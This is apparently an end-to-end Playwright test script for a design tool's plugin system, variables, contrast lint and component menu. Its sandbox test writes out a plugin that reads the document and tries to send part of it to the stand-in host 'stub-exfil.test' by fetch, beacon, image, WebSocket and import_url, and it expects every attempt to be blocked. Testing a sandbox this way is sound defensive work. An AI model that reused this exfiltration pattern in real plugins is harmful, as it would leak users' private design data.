// Round 9, P2: plugin sandbox has no network (nothing reaches a stubbed host; the plugin tools that
// fetch are refused), a stopped long run undoes in one step, variable values are type-checked, the
// contrast fix keeps the grey, and "Create multiple components" works from the context menu.
// Usage: start the dev server (or the bridge serving web/dist), then
//   cd web && E2E_URL=http://127.0.0.1:5641 node scripts/qa/r9b-e2e.mjs      Screenshots: E2E_OUT.
// Every non-local request is aborted; requests to the stub host are recorded and must be none.

import { chromium } from "playwright-core";
import fs from "node:fs";
import path from "node:path";

const URL_ = process.env.E2E_URL ?? "http://127.0.0.1:5641";
const OUT = process.env.E2E_OUT ?? "/tmp/r9b-shots";
fs.mkdirSync(OUT, { recursive: true });
const launch = { headless: true, args: ["--no-sandbox"] };
if (fs.existsSync("/opt/pw-browsers/chromium")) launch.executablePath = "/opt/pw-browsers/chromium";

let failed = 0;
const check = (name, ok, detail = "") => {
  if (!ok) failed++;
  console.log(`${ok ? "PASS" : "FAIL"}  ${name}${detail ? "  - " + detail : ""}`);
};

const browser = await chromium.launch(launch);
const context = await browser.newContext({ viewport: { width: 1440, height: 900 }, deviceScaleFactor: 2 });
await context.addInitScript(() => {
  try {
    localStorage.setItem("dt:tour-done", "1");
  } catch {
    /* sandboxed frames have no storage */
  }
});
const stubHits = [];
await context.route("**/*", (route) => {
  const u = new URL(route.request().url());
  if (["localhost", "127.0.0.1"].includes(u.hostname)) return route.continue();
  if (u.hostname.endsWith("stub-exfil.test")) stubHits.push(route.request().url());
  return route.abort();
});
const page = await context.newPage();
const dt = (fn, arg) => page.evaluate(fn, arg);
const tool = (name, input) => page.evaluate(([n, i]) => window.__dt.tool(n, i), [name, input]);
const doc = () => dt(() => window.__dt.doc());
const shot = (name) => page.screenshot({ path: path.join(OUT, `${name}.png`) });

try {
  await page.goto(URL_, { waitUntil: "domcontentloaded" });
  await page.getByText("New design file").first().click();
  await page.waitForSelector("#dt-canvas", { timeout: 20000 });
  await page.waitForTimeout(1500);

  // ---- no network from a plugin (g4_net)
  await tool("create_nodes", { nodes: [{ type: "rectangle", name: "Secret Q3 pricing", width: 40, height: 40 }] });
  const secret = Object.values((await doc()).nodes).find((n) => n.name === "Secret Q3 pricing").id;
  const id = await dt(
    async (secret) =>
      (
        await window.__dt.tool("save_plugin", {
          name: "Net",
          code: `const d = await dt.getDocument(1);
const out = {};
try { await fetch("https://stub-exfil.test/?d=" + encodeURIComponent(JSON.stringify(d).slice(0, 200)), { mode: "no-cors" }); out.fetch = "sent"; } catch (e) { out.fetch = "blocked"; }
out.beacon = typeof navigator.sendBeacon === "function" ? String(navigator.sendBeacon("https://stub-exfil.test/b", "x")) : "none";
const img = new Image(); img.src = "https://stub-exfil.test/pixel.gif";
try { const ws = new WebSocket("wss://stub-exfil.test/s"); ws.onerror = () => {}; } catch (e) {}
try { await dt.tool("import_url", { url: "https://stub-exfil.test/page" }); out.import_url = "ran"; } catch (e) { out.import_url = "refused"; }
await new Promise((r) => setTimeout(r, 800));
await dt.tool("update_nodes", { updates: [{ id: "${secret}", name: JSON.stringify(out) }] });`,
        })
      ).result.id,
    secret,
  );
  await dt((id) => window.__dt.runPlugin(id), id);
  await page.waitForFunction(() => window.__dt.plugin() === null, null, { timeout: 8000 });
  const netResult = JSON.parse((await doc()).nodes[secret].name);
  check("a plugin's fetch, beacon, image, WebSocket and import_url reach no host", stubHits.length === 0 && netResult.fetch === "blocked" && netResult.import_url === "refused", JSON.stringify({ netResult, hits: stubHits }));

  // ---- a long run, stopped, undoes in one step (g4_plugins)
  const before = Object.keys((await doc()).nodes).length;
  const loopId = await dt(
    async () =>
      (
        await window.__dt.tool("save_plugin", {
          name: "Many",
          code: `for (let i = 0; ; i++) { await dt.tool("create_nodes", { nodes: [{ type: "rectangle", name: "F" + i, width: 4, height: 4 }] }); }`,
        })
      ).result.id,
  );
  await dt((id) => window.__dt.runPlugin(id), loopId);
  await page.waitForTimeout(4500);
  await shot("plugin-running");
  const stop = page.getByRole("button", { name: /^Stop/ });
  check("a plugin running past 3 s shows Stop", (await stop.count()) > 0);
  await stop.first().click();
  await page.waitForFunction(() => window.__dt.plugin() === null, null, { timeout: 5000 });
  const made = Object.keys((await doc()).nodes).length - before;
  await page.locator("#dt-canvas").click({ position: { x: 3, y: 3 } }).catch(() => {});
  await page.keyboard.press("Control+z");
  const after = Object.keys((await doc()).nodes).length - before;
  check("Stop, then one Ctrl+Z, undoes the whole run", made > 20 && after === 0, `${made} layers made, ${after} left after one undo`);

  // ---- typed variables (g2_again)
  await tool("create_nodes", { nodes: [{ type: "frame", name: "Login", x: 400, width: 300, height: 300, children: [{ type: "rectangle", name: "Box", width: 50, height: 50 }] }] });
  const nodes = Object.values((await doc()).nodes);
  const login = nodes.find((n) => n.name === "Login").id;
  const box = nodes.find((n) => n.name === "Box").id;
  const bad = await tool("define_variables", { collection: "Num", variables: [{ name: "Radius", type: "number", value: "banana" }] });
  check("a number variable rejects 'banana', naming the variable", !bad.ok && String(bad.result).includes("Radius") && String(bad.result).includes("Default"), String(bad.result));
  const badColour = await tool("define_variables", { collection: "Col", modes: ["Light", "Dark"], variables: [{ name: "Ink", type: "color", values: { Dark: "nope" } }] });
  check("a colour variable rejects text, naming variable and mode", !badColour.ok && String(badColour.result).includes("Ink (Dark)"), String(badColour.result));
  const none = (await doc()).variables ?? [];
  check("rejected calls create no collection", !none.some((c) => c.name === "Num" || c.name === "Col"));
  const good = await tool("define_variables", { collection: "Num", variables: [{ name: "Radius", type: "number", value: "12" }] });
  const bound = await tool("update_nodes", { updates: [{ id: box, bind: { cornerRadius: "Num/Radius" } }] });
  check("a numeric string is stored as a number and binds", good.ok && bound.ok && (await doc()).nodes[box].cornerRadius === 12, JSON.stringify((await doc()).nodes[box].cornerRadius));
  const into = await tool("move_nodes", { ids: [login], parentId: login });
  check("moving a layer into itself is an error naming it", !into.ok && String(into.result).includes(login), String(into.result));
  const kinds = await tool("fix_issues", { kinds: ["nope"] });
  check("fix_issues lists the valid kinds for an unknown one", !kinds.ok && String(kinds.result).includes("lowContrast"), String(kinds.result));

  // ---- the contrast fix keeps the grey (g5_fix)
  await tool("create_nodes", {
    nodes: [{ type: "frame", name: "Page", x: -600, width: 375, height: 200, fill: "#FFFFFF", layout: { direction: "vertical", gap: 13, padding: 22 }, children: [{ type: "text", name: "Subtitle", text: "Sign in to continue to your account", fontSize: 14, fill: "#AAAAAA" }] }],
  });
  const lint = (await tool("lint_design", {})).result.issues;
  const low = lint.find((i) => i.kind === "lowContrast" && i.nodeName === "Subtitle");
  const off = lint.find((i) => i.kind === "offGrid");
  check("the off-grid message names only the wrong value", off && /^Gap 13 isn't on the 2px grid\.$/.test(off.message), off?.message);
  const m = /Use (#[0-9a-f]{6})/i.exec(low?.fixLabel ?? "");
  const lum = (c) => {
    const f = (v) => ((v /= 255) <= 0.03928 ? v / 12.92 : ((v + 0.055) / 1.055) ** 2.4);
    const [r, g, b] = [1, 3, 5].map((i) => parseInt(c.slice(i, i + 2), 16));
    return 0.2126 * f(r) + 0.7152 * f(g) + 0.0722 * f(b);
  };
  const ratio = m ? 1.05 / (lum(m[1]) + 0.05) : 0;
  check("#AAAAAA on white gets a grey that passes 4.5:1, not #111827", !!m && m[1].toLowerCase() !== "#111827" && ratio >= 4.5 && m[1].slice(1, 3) === m[1].slice(3, 5), `${m?.[1]} ${ratio.toFixed(2)}:1`);
  await dt(() => window.__dt.dispatch({ op: "select", ids: [] }));
  await page.getByText("Review", { exact: true }).first().click();
  await page.waitForTimeout(500);
  await shot("review-fix");
  await page.getByRole("button", { name: /Use #[0-9a-f]{6}/i }).first().click();
  await page.waitForTimeout(400);
  const fixed = Object.values((await doc()).nodes).find((n) => n.name === "Subtitle").fills[0].color;
  check("clicking the fix recolours the text to that grey", fixed.toLowerCase().startsWith(m[1].toLowerCase()), fixed);

  // ---- Create multiple components from the context menu
  await tool("create_nodes", {
    nodes: [0, 1, 2].map((i) => ({ type: "rectangle", name: `Item ${i}`, x: 700 + i * 80, y: -300, width: 60, height: 60, fill: "#7C5CFF" })),
  });
  const items = Object.values((await doc()).nodes).filter((n) => n.name.startsWith("Item "));
  await tool("select", { ids: items.map((n) => n.id) });
  await page.waitForTimeout(500);
  const rect = await dt((id) => {
    const r = document.querySelector(`[data-id="${id}"]`)?.getBoundingClientRect();
    return r ? { x: r.x + r.width / 2, y: r.y + r.height / 2 } : null;
  }, items[0].id);
  if (rect) await page.mouse.click(rect.x, rect.y, { button: "right" });
  await page.waitForSelector(".menu .item", { timeout: 5000 });
  const labels = await page.$$eval(".menu .item", (els) => els.map((e) => e.textContent.replace(/\s+/g, " ").trim()));
  await shot("context-menu");
  check("the menu offers Create multiple components for 3 layers", labels.some((l) => l.startsWith("Create multiple components")), labels.filter((l) => /component/i.test(l)).join(" | "));
  const compsBefore = Object.values((await doc()).nodes).filter((n) => n.type === "component").length;
  await page.locator(".menu .item", { hasText: "Create multiple components" }).click();
  await page.waitForTimeout(400);
  const compNodes = Object.values((await doc()).nodes).filter((n) => n.type === "component");
  check("it makes one component per layer", compNodes.length - compsBefore === 3, `${compNodes.length - compsBefore} new`);
  await page.locator("#dt-canvas").click({ position: { x: 3, y: 3 } }).catch(() => {});
  await page.keyboard.press("Control+z");
  check("one undo removes all three", Object.values((await doc()).nodes).filter((n) => n.type === "component").length === compsBefore);
  await tool("select", { ids: [items[0].id] });
  await page.waitForTimeout(500);
  const one = await dt((id) => {
    const r = document.querySelector(`[data-id="${id}"]`)?.getBoundingClientRect();
    return r ? { x: r.x + r.width / 2, y: r.y + r.height / 2 } : null;
  }, items[0].id);
  if (one) await page.mouse.click(one.x, one.y, { button: "right" });
  await page.waitForSelector(".menu .item", { timeout: 5000 });
  const oneLabels = await page.$$eval(".menu .item", (els) => els.map((e) => e.textContent.replace(/\s+/g, " ").trim()));
  check("a single layer doesn't show Create multiple components", !oneLabels.some((l) => l.startsWith("Create multiple")));
  await page.keyboard.press("Escape");

  // ---- the AI tool does what its text says
  const three = Object.values((await doc()).nodes).filter((n) => n.name.startsWith("Item ")).map((n) => n.id);
  const r = await tool("arrange", { action: "create_component", ids: three });
  check("AI create_component with 3 ids makes 3 components", r.ok && r.result.ids?.length === 3, JSON.stringify(r.result).slice(0, 120));
} catch (e) {
  failed++;
  console.log("FAIL  script error: " + (e?.stack ?? e));
  await shot("error").catch(() => {});
}
await browser.close().catch(() => {});
console.log(failed ? `${failed} failed` : "all passed");
process.exit(failed ? 1 : 0);
